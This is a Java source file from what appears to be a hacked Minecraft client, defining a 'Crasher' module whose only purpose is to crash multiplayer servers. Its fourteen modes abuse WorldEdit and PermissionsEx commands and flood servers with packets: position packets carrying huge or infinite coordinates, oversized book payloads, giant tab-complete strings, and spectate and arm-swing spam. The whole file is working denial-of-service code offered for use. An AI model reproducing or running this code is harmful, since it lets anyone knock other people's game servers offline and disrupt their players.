package net.minecraft.client.particle.chroma.module.exploit;

import java.util.ArrayList;
import java.util.Random;

import io.netty.buffer.Unpooled;
import net.minecraft.client.particle.chroma.event.EventTarget;
import net.minecraft.client.particle.chroma.event.events.EventReceivePacket;
import net.minecraft.client.particle.chroma.event.events.EventUpdate;
import net.minecraft.client.particle.chroma.module.Category;
import net.minecraft.client.particle.chroma.module.Module;
import net.minecraft.client.particle.chroma.settings.Setting;
import net.minecraft.client.particle.chroma.utils.NBTCrash;
import net.minecraft.client.particle.chroma.utils.RandomUtils;
import net.minecraft.client.particle.chroma.utils.Timer;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.login.client.C00PacketLoginStart;
import net.minecraft.network.login.client.C01PacketEncryptionResponse;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C09PacketHeldItemChange;
import net.minecraft.network.play.client.C0APacketAnimation;
import net.minecraft.network.play.client.C0DPacketCloseWindow;
import net.minecraft.network.play.client.C11PacketEnchantItem;
import net.minecraft.network.play.client.C12PacketUpdateSign;
import net.minecraft.network.play.client.C13PacketPlayerAbilities;
import net.minecraft.network.play.client.C14PacketTabComplete;
import net.minecraft.network.play.client.C16PacketClientStatus;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import net.minecraft.network.play.client.C18PacketSpectate;
import net.minecraft.network.play.server.S40PacketDisconnect;
import net.minecraft.util.BlockPos;
import net.minecraft.util.IChatComponent;

public class Crasher extends Module
{
	private static Timer timer;
	private static String totalString = "";
	private NBTCrash nbtCrash;
	
	public Crasher()
	{
		super("Crasher", 118, Category.EXPLOIT);
	}
	
	@Override
	public void setup()
	{
		timer = new Timer();
		ArrayList<String> modes = new ArrayList<String>();
		modes.add("WorldEdit");
		modes.add("PermissionsEx");
		modes.add("Chunk Loading");
		modes.add("AAC New");
		modes.add("AAC Other");
		modes.add("AAC Old");
		modes.add("CubeCraft");
		modes.add("Book Flood");
		modes.add("Arm Swings");
		modes.add("Teleport");
		modes.add("Spectate");
		modes.add("Tabbing");
		modes.add("Held");
		modes.add("NBT");
		this.getSetManager().rSetting(new Setting(300, "Mode", "", this, "", modes));
		this.getSetManager().rSetting(new Setting(301, "Disable", "", this, true));
		this.getSetManager().rSetting(new Setting(320, "Repeats", "", this, 1.0, 1.0, 10.0, true));
		
		for (int i = 0; i < 15000; i++)
		{
			totalString += "$§";
		}
		
		nbtCrash = new NBTCrash();
		
		super.setup();
	}
	
	@Override
	public void onEnable()
	{
		timer.reset();
		Crash();
		
		if (this.getMode().equals("CubeCraft"))
		{
			mc.thePlayer.setPosition(mc.thePlayer.posX, mc.thePlayer.posY + 0.3, mc.thePlayer.posZ);
		}
		
		if (this.getSetManager().getSettingById(301).getValBoolean())
		{
			this.setToggled(false);
		}
		
		if (this.getMode().equals("NBT"))
		{
			nbtCrash.start();
		}
		
		super.onEnable();
	}
	
	@Override
	public void onDisable()
	{
		if (this.getMode().equals("NBT"))
		{
			nbtCrash.stop();
		}
		
		super.onDisable();
	}
	
	@EventTarget
	public void onUpdate(EventUpdate event)
	{
		if (!this.getSetManager().getSettingById(301).getValBoolean())
		{
			this.setSuffix(" §7" + this.getMode());
			
			for (int i = 0; i < this.getSetManager().getSettingById(320).getValueI(); i++)
			{
				Crash();
			}
		}
	}
	
	@EventTarget
	public void onReceivePacket(EventReceivePacket event)
	{
		if (event.getPacket() instanceof S40PacketDisconnect)
		{
			this.setToggled(false);
		}
	}
	
	public static void Crash()
	{
		String mode = mc.getChroma().getSetManager().getSettingById(300).getValString();
		boolean disable = mc.getChroma().getSetManager().getSettingById(301).getValBoolean();
		
		if (mode.equals("WorldEdit"))
		{
			mc.thePlayer.sendChatMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}");
		}
		else if (mode.equals("PermissionsEx"))
		{
			if (!timer.hasReach(1300D) && !disable)
			{
				return;
			}
			
			mc.thePlayer.sendChatMessage(new Random().nextBoolean() ? "/pex promote a a" : "/pex demote a a");
		    timer.reset();
		}
		else if (mode.equals("Chunk Loading"))
		{
			for (double yPos = mc.thePlayer.posY; yPos < 255.0D; yPos += 5.0D)
			{
				mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX, yPos, mc.thePlayer.posZ, true));
			}
			
			for (int i = 0; i < (1337 * 5); i += 5)
			{
				mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX + i, 255.0D, mc.thePlayer.posZ + i, true));
			}
		}
		else if (mode.equals("AAC Old"))
		{
			mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
		}
		else if (mode.equals("AAC Other"))
		{
			for (int i = 0; i < 9999; i++)
			{
				mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX + 50000 * i, mc.thePlayer.posY + 50000 * i, mc.thePlayer.posZ + 50000 * i, true));
			}
		}
		else if (mode.equals("AAC New"))
		{
			for (int i = 0; i < 9999; i++)
			{
				mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX + 9412 * i, mc.thePlayer.posY + 9412 * i, mc.thePlayer.posZ + 9412 * i, true));
			}
		}
		else if (mode.equals("CubeCraft"))
		{
			double x = mc.thePlayer.posX;
			double y = mc.thePlayer.posY;
			double z = mc.thePlayer.posZ;
			
			for (int i = 0; i < 3000; i++)
			{
				mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y + 0.09999999999999, z, false));
				mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y, z, true));
			}
			
			mc.thePlayer.motionY = 0;
		}
		else if (mode.equals("Book Flood"))			
		{
            final ItemStack bookStack = new ItemStack(Items.writable_book);
            final NBTTagCompound bookCompound = new NBTTagCompound();

            bookCompound.setString("author", RandomUtils.randomNumber(20));
            bookCompound.setString("title", RandomUtils.randomNumber(20));

            final NBTTagList pageList = new NBTTagList();
            final String pageText = RandomUtils.randomNumber(600);

            for (int page = 0; page < 50; page++)
            {
            	pageList.appendTag(new NBTTagString(pageText));
            }

            bookCompound.setTag("pages", pageList);
            bookStack.setTagCompound(bookCompound);

            for (int packets = 0; packets < 100; packets++)
            {
                final PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
                packetBuffer.writeItemStackToBuffer(bookStack);
                mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload(new Random().nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer));
            }
		}
		else if (mode.equals("Arm Swings"))
		{
			for (int i = 0; i < 100; i++)
			{
				mc.thePlayer.sendQueue.addToSendQueue(new C0APacketAnimation());
			}
		}
		else if (mode.equals("Teleport"))
		{
			for (int i = 0; i < 100; i++)
			{
				mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX, mc.thePlayer.posY, mc.thePlayer.posZ + i * 9, true));
            }
		}
		else if (mode.equals("Spectate"))
		{
			for (int i = 0; i < 100; i++)
			{
				mc.thePlayer.sendQueue.addToSendQueue(new C18PacketSpectate());
			}	
		}
		else if (mode.equals("Tabbing"))
		{
			for (int i = 0; i < 10000; i++)
			{
				mc.thePlayer.sendQueue.addToSendQueue(new C14PacketTabComplete(totalString));
				//mc.thePlayer.sendQueue.addToSendQueue(new C14PacketTabComplete("$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§$§"));
			}
		}
		else if (mode.equals("Held"))
		{
			for (int i = 0; i < 100; i++)
			{
				mc.thePlayer.sendQueue.addToSendQueue(new C09PacketHeldItemChange());
			}
		}
	}
}